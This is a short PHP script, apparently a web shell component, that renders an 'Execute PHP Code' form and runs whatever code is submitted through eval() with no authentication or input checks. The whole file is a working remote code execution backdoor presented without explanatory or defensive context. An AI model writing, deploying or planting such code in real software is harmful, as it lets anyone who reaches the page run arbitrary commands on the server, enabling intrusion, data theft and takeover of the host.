<?php
function execphp(){ // PHP code execution function
	echo("<h4>Execute PHP Code</h4>");
	echo("<form method='POST'>");
	echo("<textarea name='phpexec' rows=5 cols=100>");
	if(!$_POST['phpexec'])
		echo("/*Don't include <? ?> tags*/\n");
	echo(htmlentities($_POST['phpexec']) . "</textarea>\n<br>\n");
	echo("<input type='submit' value='Execute'>");
	echo("</form>");
	if($_POST['phpexec']){
		echo("<textarea rows=10 cols=100>");
		eval(stripslashes($_POST['phpexec']));
		echo("</textarea>");
	}
}

execphp();

echo "end";
?>